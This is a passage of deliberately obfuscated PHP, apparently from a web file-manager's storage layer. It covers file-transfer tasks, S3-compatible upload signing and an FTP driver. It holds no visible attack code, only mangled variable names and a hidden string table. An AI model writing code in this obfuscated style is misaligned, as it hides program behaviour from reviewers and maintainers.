$¾¡£ı“è . $®ø¢Ø†‚[2292] . $¹¢ßƒ¡Ü; $ñİîïŠí = LNG($¾¡£ı“è == $®ø¢Ø†‚[620] ? $®ø¢Ø†‚[2293] : $®ø¢Ø†‚[2294]); $ïúå±‰ = new TaskFileTransfer($æğã¥º, $®ø¢Ø†‚[215], $ÃÎÑîŞ, $ñİîïŠí . $®ø¢Ø†‚[462] . $éø¬«Ñ[$®ø¢Ø†‚[32]] . $®ø¢Ø†‚[214] . $¹¢ßƒ¡Ü); $ïúå±‰->task[$®ø¢Ø†‚[812]] = (double) $¼ÑÒõ†·; $Ì—Œ¢ß­ = KodIO::defaultDriver(); $ŞĞ­Öı€ = $Ì—Œ¢ß­[$®ø¢Ø†‚[475]]; $úºáŸ£ü = $¯ğ¨Å× = $ÎÑå¹Ÿ• = array(); $¾ÅøàáŠ = Model($®ø¢Ø†‚[230])->where($ßíÆÄô¡)->field($®ø¢Ø†‚[2295])->select(); foreach ($¾ÅøàáŠ as $òŠ†ì) { $È¡ûÒ­‹ = $òŠ†ì[$®ø¢Ø†‚[541]]; if ($¦‡¶Ì†¨) { $¯ğ¨Å×[] = $È¡ûÒ­‹; continue; } $¦¸±¦‰Ò = $òŠ†ì[$®ø¢Ø†‚[87]]; $æ¬Ö€Ò‹ = get_path_father($¦¸±¦‰Ò); $ÎÑå¹Ÿ•[] = $æ¬Ö€Ò‹; $æ¬Ö€Ò‹ = str_replace("\173\151\157\x3a{$¹¢ßƒ¡Ü}\175\x2f", "\x7b\x69\x6f\x3a{$ŞĞ­Öı€}\175\x2f", $æ¬Ö€Ò‹); if (!IO::exist($¦¸±¦‰Ò)) { $úºáŸ£ü[] = $È¡ûÒ­‹; $ïúå±‰->updateFileEnd($òŠ†ì[$®ø¢Ø†‚[32]], $òŠ†ì[$®ø¢Ø†‚[79]]); write_log($®ø¢Ø†‚[2296] . $¦¸±¦‰Ò, $®ø¢Ø†‚[1877]); continue; } $úì…ïÓÆ = IO::move($¦¸±¦‰Ò, $æ¬Ö€Ò‹, REPEAT_RENAME); if (!$úì…ïÓÆ) { $¯ğ¨Å×[] = $È¡ûÒ­‹; $ïúå±‰->updateFileEnd($òŠ†ì[$®ø¢Ø†‚[32]], $òŠ†ì[$®ø¢Ø†‚[79]]); write_log($®ø¢Ø†‚[2297] . $¦¸±¦‰Ò, $®ø¢Ø†‚[1877]); continue; } $ßíÆÄô¡ = array($®ø¢Ø†‚[541] => $È¡ûÒ­‹); $¤µ©ß‡ = array($®ø¢Ø†‚[866] => $ŞĞ­Öı€, $®ø¢Ø†‚[87] => $úì…ïÓÆ); Model($®ø¢Ø†‚[230])->where($ßíÆÄô¡)->save($¤µ©ß‡); } $îªúÏÍ± = $ïúå±‰->task; if (!$¦‡¶Ì†¨) { Cache::set($æğã¥º, $îªúÏÍ±); } $ïúå±‰->end(); $úºáŸ£ü = array_unique($úºáŸ£ü); $¯ğ¨Å× = array_unique($¯ğ¨Å×); if (!$¦‡¶Ì†¨ && ($úºáŸ£ü || $¯ğ¨Å×)) { $ŸªŒî±ı = array(); if ($úºáŸ£ü) { $ŸªŒî±ı[] = sprintf(LNG($®ø¢Ø†‚[2298]), count($úºáŸ£ü)); } if ($¯ğ¨Å×) { $ŸªŒî±ı[] = sprintf(LNG($®ø¢Ø†‚[2299]), count($¯ğ¨Å×)); } $ŸªŒî±ı = sprintf(LNG($®ø¢Ø†‚[2300]), implode($®ø¢Ø†‚[2301], $ŸªŒî±ı)) . $®ø¢Ø†‚[2302] . date($®ø¢Ø†‚[2303]) . $®ø¢Ø†‚[2304]; if ($¾¡£ı“è == $®ø¢Ø†‚[1914]) { $ŸªŒî±ı .= $®ø¢Ø†‚[2305] . LNG($®ø¢Ø†‚[2306]); } $îªúÏÍ±[$®ø¢Ø†‚[1241]] = $ŸªŒî±ı; Cache::set($æğã¥º, $îªúÏÍ±); unset($éø¬«Ñ[$®ø¢Ø†‚[6]]); $·‡ÂŸÅ = array($®ø¢Ø†‚[475] => $¹¢ßƒ¡Ü, $®ø¢Ø†‚[2184] => $®ø¢Ø†‚[620], $®ø¢Ø†‚[32] => $éø¬«Ñ[$®ø¢Ø†‚[32]], $®ø¢Ø†‚[1264] => $éø¬«Ñ); Hook::trigger($®ø¢Ø†‚[1758], array($®ø¢Ø†‚[1264] => $·‡ÂŸÅ, $®ø¢Ø†‚[1274] => !0)); show_json($ŸªŒî±ı, !1, 100111); } if ($¾¡£ı“è == $®ø¢Ø†‚[620]) { return !0; } if ($úºáŸ£ü || $¯ğ¨Å×) { $Š› €Ø = array_merge($úºáŸ£ü, $¯ğ¨Å×); $Š› €Ø = array_filter(array_unique($Š› €Ø)); $this->removeByFileID($Š› €Ø); } if ($ÎÑå¹Ÿ•) { $ÎÑå¹Ÿ• = array_filter(array_unique($ÎÑå¹Ÿ•)); foreach ($ÎÑå¹Ÿ• as $¦¸±¦‰Ò) { $è‚ÜíÍê = IO::has($¦¸±¦‰Ò, !0); if (!$è‚ÜíÍê[$®ø¢Ø†‚[239]] && !$è‚ÜíÍê[$®ø¢Ø†‚[240]]) { IO::remove($¦¸±¦‰Ò); } } } return $this->remove($¹¢ßƒ¡Ü); } private function removeByFileID($·Ş¬®º = array()) { $—‹¡Ò¯Ú =& $_SERVER[ìïæ“œî]; if (empty($·Ş¬®º)) { return; } $¤ö—î¥’ = array($—‹¡Ò¯Ú[541] => array($—‹¡Ò¯Ú[7], $·Ş¬®º)); $Û©ôãö = Model($—‹¡Ò¯Ú[1394])->where($¤ö—î¥’)->field($—‹¡Ò¯Ú[193])->select(); if (!$Û©ôãö) { return Model($—‹¡Ò¯Ú[544])->remove($·Ş¬®º); } $Û©ôãö = array_to_keyvalue($Û©ôãö, $—‹¡Ò¯Ú[12], $—‹¡Ò¯Ú[193]); foreach ($Û©ôãö as $‰Î…ÒôÏ) { Model($—‹¡Ò¯Ú[873])->removeNow($‰Î…ÒôÏ, !1); } } private function removeShareItems($ˆ¥ÄØó) { $…ÔÙùå„ =& $_SERVER[ìïæ“œî]; $˜ğåíÀ¶ = "\x7b\x69\157\x3a{$ˆ¥ÄØó}\x7d\x2f"; $ŸşŠØ• = array($…ÔÙùå„[193] => 0, $…ÔÙùå„[1234] => array($…ÔÙùå„[459], "{$˜ğåíÀ¶}\x25")); $§ÊÇ½§® = Model($…ÔÙùå„[1925])->where($ŸşŠØ•)->field($…ÔÙùå„[665])->select(); if (empty($§ÊÇ½§®)) { return; } $ù¶üµï£ = array_to_keyvalue($§ÊÇ½§®, $…ÔÙùå„[12], $…ÔÙùå„[665]); Model($…ÔÙùå„[664])->remove($ù¶üµï£); } } goto DïÑ‡çÊÇ; e¶ëùÓ‚Êà: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ğ¢Ùèà) { parent::__construct($ğ¢Ùèà); $this->setSignVersion($_SERVER[ìïæ“œî][247]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($á´ŒùèÔ) { parent::__construct($á´ŒùèÔ); $this->setSignVersion($_SERVER[ìïæ“œî][247]); } public function uploadFormData($ò‹í™µ, $ûÃïñ¥é = 3600) { $¯´ññø• =& $_SERVER[ìïæ“œî]; $ÙèÈÔ²Ù = $¯´ññø•[229]; $”ø»úà¾ = $¯´ññø•[270]; $·øœú  = $¯´ññø•[62]; $º£ÁÍ‰ï = gmdate($¯´ññø•[271]); $ğ æìœ² = gmdate($¯´ññø•[272]); $ìâïÃÏ = $¯´ññø•[273]; $İÏŸÊò = $ûÃïñ¥é . $¯´ññø•[12]; $˜ŞîìÅŒ = $¯´ññø•[274]; $š›ÔŞÕ = array($this->accessKey, $ğ æìœ², $this->region, $·øœú , $ìâïÃÏ); $ÊÚıé‰‚ = implode($¯´ññø•[8], $š›ÔŞÕ); $º¸•”„ò = array($¯´ññø•[275] => gmdate($¯´ññø•[299], strtotime($¯´ññø•[277])), $¯´ññø•[278] => array(array($¯´ññø•[279] => $this->bucket), array($¯´ññø•[280] => $ÙèÈÔ²Ù), array($¯´ññø•[281], $¯´ññø•[282], $¯´ññø•[12]), array($¯´ññø•[281], $¯´ññø•[283], $¯´ññø•[12]), array($¯´ññø•[281], $¯´ññø•[284], $¯´ññø•[12]), array($¯´ññø•[285] => $˜ŞîìÅŒ), array($¯´ññø•[286] => $ÊÚıé‰‚), array($¯´ññø•[287] => $”ø»úà¾), array($¯´ññø•[288] => $º£ÁÍ‰ï), array($¯´ññø•[289] => $İÏŸÊò))); $‰Õ«¬ã = base64_encode(json_encode($º¸•”„ò)); $×Î…‚Ò„ = hash_hmac($¯´ññø•[290], $ğ æìœ², $¯´ññø•[291] . $this->secret, !0); $±§±Ú…Æ = hash_hmac($¯´ññø•[290], $this->region, $×Î…‚Ò„, !0); $¬µÆ¼¢® = hash_hmac($¯´ññø•[290], $·øœú , $±§±Ú…Æ, !0); $³Ú€Æ›– = hash_hmac($¯´ññø•[290], $ìâïÃÏ, $¬µÆ¼¢®, !0); $«´Ÿ«…© = hash_hmac($¯´ññø•[290], $‰Õ«¬ã, $³Ú€Æ›–); $•îï¯‡ = array($¯´ññø•[246] => $¯´ññø•[12], $¯´ññø•[292] => $¯´ññø•[12], $¯´ññø•[280] => $ÙèÈÔ²Ù, $¯´ññø•[285] => $˜ŞîìÅŒ, $¯´ññø•[293] => $‰Õ«¬ã, $¯´ññø•[294] => $ÊÚıé‰‚, $¯´ññø•[295] => $”ø»úà¾, $¯´ññø•[296] => $º£ÁÍ‰ï, $¯´ññø•[297] => $İÏŸÊò, $¯´ññø•[298] => $«´Ÿ«…©, $¯´ññø•[208] => $this->getHost()); return $•îï¯‡; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($Ğù½’Ì‡) { parent::__construct(); if (count($Ğù½’Ì‡) > 0) { $this->_init($Ğù½’Ì‡); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ş³¥§³¼) { $å¢ü§²ò =& $_SERVER[ìïæ“œî]; global $config; $this->appCharset = $config[$å¢ü§²ò[1412]]; $this->systemCharset = $config[$å¢ü§²ò[1413]]; if (isset($ş³¥§³¼[$å¢ü§²ò[1414]]) && $ş³¥§³¼[$å¢ü§²ò[1414]]) { $this->systemCharset = $ş³¥§³¼[$å¢ü§²ò[1414]]; } } public function iconvApp($Êª÷É¤) { return $this->iconvTo($Êª÷É¤, $this->systemCharset, $this->appCharset); } public function iconvSystem($†¡„ƒ°Å) { return $this->iconvTo($†¡„ƒ°Å, $this->appCharset, $this->systemCharset); } public function getPathOuter($¨Àóøß‰) { $—²’¼Ó¿ =& $_SERVER[ìïæ“œî]; $Ûí¼ê = $this->iconvApp($this->pathBase); $¨Àóøß‰ = $this->iconvApp($¨Àóøß‰); if (substr($Ûí¼ê, 0, 2) == $—²’¼Ó¿[1415]) { $Ûí¼ê = BASIC_PATH . substr($Ûí¼ê, 2); } if (substr($¨Àóøß‰, 0, 2) == $—²’¼Ó¿[1415]) { $¨Àóøß‰ = BASIC_PATH . substr($¨Àóøß‰, 2); } $Ûí¼ê = KodIO::clear($Ûí¼ê); $¨Àóøß‰ = KodIO::clear($¨Àóøß‰); $¨Àóøß‰ = substr($¨Àóøß‰, strlen($Ûí¼ê)); if (empty($this->pathDriver)) { return $¨Àóøß‰; } return $this->pathDriver . $—²’¼Ó¿[8] . ltrim($¨Àóøß‰, $—²’¼Ó¿[8]); } private function _init($´é²øÃ = array()) { $÷•Ï€’¤ =& $_SERVER[ìïæ“œî]; if (!function_exists($÷•Ï€’¤[1416])) { throw new Exception(LNG($÷•Ï€’¤[1417])); } $this->config = $´é²øÃ; $this->charsetReset($´é²øÃ); foreach ($´é²øÃ as $œó†Ûç± => $ïÉãÑÊ™) { if (isset($this->{$œó†Ûç±})) { $this->{$œó†Ûç±} = $ïÉãÑÊ™; } } return $this->_login($´é²øÃ); } private function _login($¶ãœ†©Ô) { $š¬ğîë =& $_SERVER[ìïæ“œî]; static $ù„ò…¼Ş = array(); $˜æÕæ®ï = md5(json_encode($¶ãœ†©Ô)); if (isset($ù„ò…¼Ş[$˜æÕæ®ï])) { foreach ($ù„ò…¼Ş[$˜æÕæ®ï] as $Æß¨î’ => $–ø™Ï²) { $this->{$Æß¨î’} = $–ø™Ï²; } return !0; } $Ú«ÁíÌ½ = parse_url(trim($this->server, $š¬ğîë[8])); $this->host = $Ú«ÁíÌ½[$š¬ğîë[208]]; $ú·Š‹Œ³ = isset($Ú«ÁíÌ½[$š¬ğîë[207]]) && $Ú«ÁíÌ½[$š¬ğîë[207]] == $š¬ğîë[1418] ? !0 : !1; $this->scheme = $ú·Š‹Œ³ ? $š¬ğîë[1419] : $š¬ğîë[1420]; $this->port = isset($Ú«ÁíÌ½[$š¬ğîë[209]]) ? $Ú«ÁíÌ½[$š¬ğîë[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($š¬ğîë[1421]) . $this->host . $š¬ğîë[4] . $this->port, !0); return !1; } $ÌÀ©Õô’ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ÌÀ©Õô’) { $this->writeLog(LNG($š¬ğîë[1422]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $˜†æ¥¥¨ = $this->pasv == $š¬ğîë[91] ? !0 : !1; @ftp_pasv($this->connect, $˜†æ¥¥¨); $ù„ò…¼Ş[$˜æÕæ®ï] = array($š¬ğîë[1423] => $this->connect, $š¬ğîë[208] => $this->host, $š¬ğîë[207] => $this->scheme, $š¬ğîë[209] => $this->port); return $ÌÀ©Õô’; } private function _isconn($ç®íÖ»å = true) { if (is_resource($this->connect)) { return !0; } if (!$ç®íÖ»å) { return !1; } return $this->_login($this->config); } public function mkfile($ã˜øíñ, $‘ô“¬™” = '', $î¿ĞµŠœ = REPEAT_RENAME) { if ($this->setContent($ã˜øíñ, $‘ô“¬™”)) { return $this->getPathOuter($ã˜øíñ); } $this->writeLog(LNG($_SERVER[ìïæ“œî][1424]), !0); return !1; } public function mkdir($ÚùŸã§, $ÜÈåã¬Ã = REPEAT_SKIP) { $œ”¾ä¿€ =& $_SERVER[ìïæ“œî]; if (!$ÚùŸã§ || $ÚùŸã§ == $œ”¾ä¿€[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ÚùŸã§ = $this->iconvSystem($ÚùŸã§); if ($this->_isFolder($ÚùŸã§) || @ftp_mkdir($this->connect, $ÚùŸã§)) { return $this->getPathOuter($ÚùŸã§); } if (!$this->mkdir($this->pathFather($ÚùŸã§))) { return !1; } if ($ÚùŸã§ = @ftp_mkdir($this->connect, $ÚùŸã§)) { return $this->getPathOuter($ÚùŸã§); } $this->writeLog(__FUNCTION__ . $œ”¾ä¿€[1425], !0); return !1; } public function copyFile($ş”­ûõ¿, $œà¹å–„) { if (!$this->_isconn()) { return !1; } $®„Ü®«Ò = $this->pathThis($this->iconvSystem($ş”­ûõ¿)); $áÕ¬Á·Å = $this->tempFile($®„Ü®«Ò); $´ÚïÇ¿è = $this->iconvApp($áÕ¬Á·Å); $this->download($ş”­ûõ¿, $´ÚïÇ¿è); $ó’êã¤ë = $this->upload($œà¹å–„, $´ÚïÇ¿è); $this->tempFileRemve($áÕ¬Á·Å); return $ó’êã¤ë; } public function moveFile($¢×¯ë†Ã, $¾´„å•Ä) { if (!$this->_isconn()) { return !1; } $¢×¯ë†Ã = $this->iconvSystem($¢×¯ë†Ã); $¾´„å•Ä = $this->iconvSystem($¾´„å•Ä); $êª¤ûÀ‰ = @ftp_rename($this->connect, $¢×¯ë†Ã, $¾´„å•Ä); if (!$êª¤ûÀ‰) { $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][1425], !0); return !1; } return $this->getPathOuter($¾´„å•Ä); } public function delFile($ùÀ¬‰û­) { if (!$this->_isconn()) { return !1; } $ùÀ¬‰û­ = $this->iconvSystem($ùÀ¬‰û­); $Óé‚Çö = @ftp_delete($this->connect, $ùÀ¬‰û­); if (!$Óé‚Çö) { $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][1425], !0); } return $Óé‚Çö; } public function delFolder($‡Äæúœ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Õ¯õÇõĞ = $«Ñãå€µ = array(); $this->fileList($‡Äæúœ, $Õ¯õÇõĞ, $«Ñãå€µ, !0); $this->listItemCache = !0; foreach ($«Ñãå€µ as $ıíò»äµ) { $è—İÙ¥¸ = $this->iconvSystem($ıíò»äµ[$_SERVER[ìïæ“œî][32]]); $æ”åúÅ = @ftp_delete($this->connect, $è—İÙ¥¸); if (!$æ”åúÅ) { return !1; } } foreach ($Õ¯õÇõĞ as $è—İÙ¥¸) { $è—İÙ¥¸ = $this->iconvSystem($è—İÙ¥¸); $æ”åúÅ = @ftp_rmdir($this->connect, $è—İÙ¥¸); if (!$æ”åúÅ) { return !1; } } $‡Äæúœ = $this->iconvSystem($‡Äæúœ); return @ftp_rmdir($this->connect, $‡Äæúœ); } public function rename($–ƒÒ¤Î, $î³µó) { $¶’Ù†¢Û =& $_SERVER[ìïæ“œî]; if (!$this->_isconn()) { return !1; } $¦ò’š¯Ñ = $this->fileNameAuto($this->pathFather($–ƒÒ¤Î), $î³µó); $¦ò’š¯Ñ = $this->iconvSystem($¦ò’š¯Ñ); $–ƒÒ¤Î = $this->iconvSystem($–ƒÒ¤Î); $ıë…ÔÑñ = $this->pathFather($–ƒÒ¤Î); $¨…ìıÅ = rtrim($ıë…ÔÑñ, $¶’Ù†¢Û[8]) . $¶’Ù†¢Û[8] . $¦ò’š¯Ñ; $ıÖ¨ˆå³ = @ftp_rename($this->connect, $–ƒÒ¤Î, $¨…ìıÅ); if (!$ıÖ¨ˆå³) { $this->writeLog(__FUNCTION__ . $¶’Ù†¢Û[1425], !0); return !1; } $¨…ìıÅ = $this->iconvApp($¨…ìıÅ); return $this->getPathOuter($¨…ìıÅ); } private function folderInfo($Òìå×›Ï, $ªÔßí»İ = false) { $ÀŒ°˜å¬ =& $_SERVER[ìïæ“œî]; $à‰ñ¢å¿ = array($ÀŒ°˜å¬[32] => $this->pathThis($Òìå×›Ï), $ÀŒ°˜å¬[87] => $this->getPathOuter($ÀŒ°˜å¬[8] . $Òìå×›Ï), $ÀŒ°˜å¬[33] => $ÀŒ°˜å¬[78]); if ($ªÔßí»İ) { return $à‰ñ¢å¿; } $à‰ñ¢å¿[$ÀŒ°˜å¬[231]] = $à‰ñ¢å¿[$ÀŒ°˜å¬[88]] = 0; $à‰ñ¢å¿[$ÀŒ°˜å¬[232]] = $à‰ñ¢å¿[$ÀŒ°˜å¬[233]] = !0; return $à‰ñ¢å¿; } private function fileInfo($ò÷¬¶ñ, $ºÄ‹Š× = false, $Ãß´—ëä = array()) { $Ÿ½íÎ—Ã =& $_SERVER[ìïæ“œî]; $»õ™’üõ = array($Ÿ½íÎ—Ã[32] => $this->pathThis($ò÷¬¶ñ), $Ÿ½íÎ—Ã[87] => $this->getPathOuter($Ÿ½íÎ—Ã[8] . $ò÷¬¶ñ), $Ÿ½íÎ—Ã[33] => $Ÿ½íÎ—Ã[230], $Ÿ½íÎ—Ã[79] => isset($Ãß´—ëä[$Ÿ½íÎ—Ã[79]]) ? $Ãß´—ëä[$Ÿ½íÎ—Ã[79]] : 0, $Ÿ½íÎ—Ã[169] => $this->ext($ò÷¬¶ñ)); if ($ºÄ‹Š×) { return $»õ™’üõ; } $»õ™’üõ[$Ÿ½íÎ—Ã[231]] = $»õ™’üõ[$Ÿ½íÎ—Ã[88]] = 0; $»õ™’üõ[$Ÿ½íÎ—Ã[232]] = $»õ™’üõ[$Ÿ½íÎ—Ã[233]] = !0; $Ôºö·Şº = $this->iconvSystem($ò÷¬¶ñ); $»õ™’üõ[$Ÿ½íÎ—Ã[88]] = @ftp_mdtm($this->connect, $Ôºö·Şº); if (empty($Ãß´—ëä)) { $Ãß´—ëä = $this->objectMeta($ò÷¬¶ñ); if (!$Ãß´—ëä) { return $»õ™’üõ; } } $»õ™’üõ[$Ÿ½íÎ—Ã[79]] = $Ãß´—ëä[$Ÿ½íÎ—Ã[79]]; return $»õ™’üõ; } public function size($©«°ï×¾) { $ÎåØÂ³Â = $this->objectMeta($©«°ï×¾); return $ÎåØÂ³Â ? $ÎåØÂ³Â[$_SERVER[ìïæ“œî][79]] : 0; } public function info($é•¦â) { if ($this->isFile($é•¦â)) { return $this->fileInfo($é•¦â, 0); } else { if ($this->isFolder($é•¦â)) { return $this->folderInfo($é•¦â); } } return !1; } private function fileList($¹‡Êò®¿, &$›¯µƒ„, &$«åÈîş, $Ä¥úşÏŠ = false) { $™Š±É™ä =& $_SERVER[ìïæ“œî]; $¹‡Êò®¿ = $this->iconvSystem($¹‡Êò®¿); if (!$this->isFolder($¹‡Êò®¿)) { return !1; } @ftp_chdir($this->connect, $™Š±É™ä[8]); $¹‡Êò®¿ = rtrim($¹‡Êò®¿, $™Š±É™ä[8]) . $™Š±É™ä[8]; check_abort(); $üÜø†Ó‹ = @ftp_rawlist($this->connect, $¹‡Êò®¿); if (!$üÜø†Ó‹) { $üÜø†Ó‹ = array(); } $ö¶“ÀŒ = array($™Š±É™ä[10] => 1, $™Š±É™ä[1340] => 1); foreach ($üÜø†Ó‹ as $‡—çºÅ) { $ëşÃ•† = $this->_listItem($‡—çºÅ); if ($ëşÃ•†[0] == $™Š±É™ä[807]) { continue; } $Æàİ”âÑ = $ëşÃ•†[8]; if (empty($Æàİ”âÑ) && $Æàİ”âÑ !== $™Š±É™ä[228] || isset($ö¶“ÀŒ[$Æàİ”âÑ])) { continue; } $Æàİ”âÑ = $this->iconvApp($¹‡Êò®¿ . ltrim($Æàİ”âÑ, $™Š±É™ä[8])); $È¶›¼Ç³ = array($™Š±É™ä[32] => $Æàİ”âÑ, $™Š±É™ä[33] => $™Š±É™ä[230], $™Š±É™ä[79] => $ëşÃ•†[4]); if (substr($‡—çºÅ, 0, 1) == $™Š±É™ä[1426]) { $È¶›¼Ç³[$™Š±É™ä[33]] = $™Š±É™ä[78]; $È¶›¼Ç³[$™Š±É™ä[79]] = 0; } $¢Ï¡û˜Ş = $È¶›¼Ç³[$™Š±É™ä[33]] == $™Š±É™ä[78] ? !0 : !1; $this->cacheMethodInfoSet($Æàİ”âÑ, $¢Ï¡û˜Ş, $È¶›¼Ç³); if ($¢Ï¡û˜Ş) { $›¯µƒ„[] = $Æàİ”âÑ; if ($Ä¥úşÏŠ) { $this->fileList($Æàİ”âÑ, $›¯µƒ„, $«åÈîş, $Ä¥úşÏŠ); } continue; } $«åÈîş[] = $È¶›¼Ç³; } $this->cacheMethodInfoSet($¹‡Êò®¿, !0); } private function _listItem($—¦ÏŸû) { if (empty($—¦ÏŸû)) { return array(); } $®¸©“İå = preg_split($_SERVER[ìïæ“œî][1427], $—¦ÏŸû); if (count($®¸©“İå) <= 9) { return $®¸©“İå; } $®¸©“İå[8] = trim(substr($—¦ÏŸû, strpos($—¦ÏŸû, $®¸©“İå[7]) + strlen($®¸©“İå[7]))); return array_splice($®¸©“İå, 0, 9); } public function listPath($Ì†ÑÊô, $€§øÁáŸ = false) { $úÎóØÜµ =& $_SERVER[ìïæ“œî]; if (!$this->_isconn()) { return !1; } $ãŞ–’ = $œããó»õ = array(); $this->fileList($Ì†ÑÊô, $ãŞ–’, $œããó»õ); foreach ($ãŞ–’ as $Ã–ù±ñ => $‹ı÷ñ’Å) { $ãŞ–’[$Ã–ù±ñ] = $this->folderInfo($‹ı÷ñ’Å, $€§øÁáŸ); } foreach ($œããó»õ as $Ã–ù±ñ => $‹ı÷ñ’Å) { $œããó»õ[$Ã–ù±ñ] = $this->fileInfo($‹ı÷ñ’Å[$úÎóØÜµ[32]], $€§øÁáŸ, $‹ı÷ñ’Å); } return array($úÎóØÜµ[85] => $ãŞ–’, $úÎóØÜµ[86] => $œããó»õ); } public function has($ºƒ¥Ê¥‡, $Î«›“×Û = false, $¾Ôú¡Í¨ = true) { $š­ÚààÇ =& $_SERVER[ìïæ“œî]; $ŸÒ‚è¢ç = $í”€ƒ©» = array(); $Üî›î = $Î«›“×Û ? !0 : !1; $this->fileList($ºƒ¥Ê¥‡, $ŸÒ‚è¢ç, $í”€ƒ©», $Üî›î); if ($Î«›“×Û) { return array($š­ÚààÇ[239] => count($í”€ƒ©»), $š­ÚààÇ[240] => count($ŸÒ‚è¢ç)); } if ($¾Ôú¡Í¨) { if (count($í”€ƒ©»)) { return !0; } } else { if (count($ŸÒ‚è¢ç)) { return !0; } } return !1; } public function listAll($†äçé–Û) { $Æ­ÌÎà =& $_SERVER[ìïæ“œî]; if (!$this->_isconn()) { return !1; } $™ÏĞ”Ô² = $±óã‡Ö³ = array(); $this->fileList($†äçé–Û, $™ÏĞ”Ô², $±óã‡Ö³, !0); $€ìÚàÚ = array_to_keyvalue($±óã‡Ö³, $Æ­ÌÎà[32]); foreach ($™ÏĞ”Ô² as $‡£¶ÃÔñ) { if (is_string($‡£¶ÃÔñ)) { $€ìÚàÚ[$‡£¶ÃÔñ] = array($Æ­ÌÎà[79] => 0); } } return $this->listAllFiles($†äçé–Û, $€ìÚàÚ); } public function getContent($·£áÑë) { if (!$this->_isconn()) { return !1; } $·£áÑë = $this->iconvSystem($·£áÑë); return $this->fileSubstr($·£áÑë); } public function setContent($ «¡ùšè, $€€‚Şëô = '') { if (!$this->_isconn()) { return !1; } $“ŞŸ½´· = $this->pathThis($this->iconvSystem($ «¡ùšè)); $ş¢Àó£Œ = $this->tempFile($“ŞŸ½´·); file_put_contents($ş¢Àó£Œ, $€€‚Şëô); $óŞà›ùá = $this->upload($ «¡ùšè, $this->iconvApp($ş¢Àó£Œ)); $this->tempFileRemve($ş¢Àó£Œ); return $óŞà›ùá; } public function fileSubstr($ÔÑşÏÛì, $îÖ¢¯†™ = 0, $èÃş®“ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ÔÑşÏÛì, $îÖ¢¯†™, $èÃş®“); } private function ftpRequest($ƒ¶ééÁ, $Ì¾”Úö® = 0, $è«Ïˆ˜³ = false) { $ƒ¶ééÁ = $this->iconvSystem($ƒ¶ééÁ); $ÉúÆµ³Ê = $this->scheme . $this->host . $_SERVER[ìïæ“œî][4] . $this->port; $ƒ§õ¸¤ü = curl_init(); curl_setopt($ƒ§õ¸¤ü, CURLOPT_URL, $ÉúÆµ³Ê . $this->pathEncode($ƒ¶ééÁ)); curl_setopt($ƒ§õ¸¤ü, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($è«Ïˆ˜³) { $™°«¤†— = $Ì¾”Úö® + $è«Ïˆ˜³ - 1; curl_setopt($ƒ§õ¸¤ü, CURLOPT_RANGE, "{$Ì¾”Úö®}\x2d{$™°«¤†—}"); } curl_setopt($ƒ§õ¸¤ü, CURLOPT_RETURNTRANSFER, 1); $Ë†±çã = curl_exec($ƒ§õ¸¤ü); curl_close($ƒ§õ¸¤ü); return $Ë†±çã; } public function upload($½û³¶•», $ŸÆšÈí, $şÆÙ˜Õ› = false, $†–©†Ô¸ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($½û³¶•»))) { return !1; } $½û³¶•» = $this->iconvSystem($½û³¶•»); $ŸÆšÈí = $this->iconvSystem($ŸÆšÈí); $†›èµÅ = ftp_nb_put($this->connect, $½û³¶•», $ŸÆšÈí, FTP_BINARY); while ($†›èµÅ == FTP_MOREDATA) { $†›èµÅ = ftp_nb_continue($this->connect); } if ($†›èµÅ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][1425], !0); return !1; } return $this->getPathOuter($½û³¶•»); } public function download($¡¶ÓÅÆ¢, $¯Úœíƒ— = '') { if (!$this->_isconn()) { return !1; } $˜öêÍöŸ = $this->pathFather($¯Úœíƒ—); if (!IO::mkdir($˜öêÍöŸ)) { return !1; } $¡¶ÓÅÆ¢ = $this->iconvSystem($¡¶ÓÅÆ¢); $¯Úœíƒ— = $this->iconvSystem($¯Úœíƒ—); $„™ÖÖóÑ = ftp_nb_get($this->connect, $¯Úœíƒ—, $¡¶ÓÅÆ¢, FTP_BINARY); while ($„™ÖÖóÑ == FTP_MOREDATA) { $„™ÖÖóÑ = ftp_nb_continue($this->connect); } if ($„™ÖÖóÑ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][1425], !0); return !1; } return $this->iconvApp($¯Úœíƒ—); } public function exist($Â¹¶ÍÒŞ) { return $this->isFile($Â¹¶ÍÒŞ) || $this->isFolder($Â¹¶ÍÒŞ); } public function isFile($ŠôñßÓ) { return !$this->isFolder($ŠôñßÓ) && $this->objectMeta($ŠôñßÓ); } public function isFolder($¯ƒ“ ·¿) { return $this->cacheMethod($_SERVER[ìïæ“œî][179], $¯ƒ“ ·¿); } protected function objectMeta($è‹ÚÚÎÉ) { return $this->cacheMethod($_SERVER[ìïæ“œî][181], $è‹ÚÚÎÉ); } protected function _objectMeta($¢å±óÁ) { $Ãå°×³· =& $_SERVER[ìïæ“œî]; if ($¢å±óÁ == $Ãå°×³·[12] || $¢å±óÁ == $Ãå°×³·[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¢å±óÁ = $this->iconvSystem($¢å±óÁ); $§õÓÁíœ = array($Ãå°×³·[32] => $this->iconvApp($¢å±óÁ), $Ãå°×³·[33] => $Ãå°×³·[230], $Ãå°×³·[79] => 0); @ftp_chdir($this->connect, $Ãå°×³·[8]); $Ø†»‡ÙØ = @ftp_size($this->connect, $¢å±óÁ); if ($Ø†»‡ÙØ 